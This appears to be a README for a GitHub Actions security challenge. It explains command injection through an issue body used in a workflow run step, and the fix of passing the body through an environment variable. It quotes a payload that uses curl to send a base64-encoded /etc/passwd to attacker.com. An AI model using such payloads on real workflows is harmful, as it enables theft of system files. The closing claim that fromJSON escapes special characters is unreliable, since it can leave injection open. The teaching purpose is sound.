# Challenge 4: Command Injection from Issue Body

This challenge demonstrates a command injection vulnerability that can occur when using the issue body directly in a `run` step.

## Vulnerability

The `vulnerable.yml` workflow is triggered when a new issue is opened. The `run` step in the `vulnerable_job` directly uses the issue body in a shell command. An attacker can create an issue with a malicious body that includes shell commands. For example, an attacker could create an issue with the body:

```
; curl http://attacker.com/$(cat /etc/passwd | base64)
```

When the workflow runs, the shell will execute the `curl` command, sending the base64-encoded contents of the `/etc/passwd` file to the attacker's server.

## Fix

The `fixed.yml` workflow mitigates this vulnerability by passing the issue body as an environment variable to the script. This ensures that the issue body is treated as a single string and not executed as a command.

## Advanced Mitigation

In addition to using environment variables, you can also use the `fromJSON` function to parse the issue body and escape any special characters. This can provide an extra layer of protection against command injection attacks.
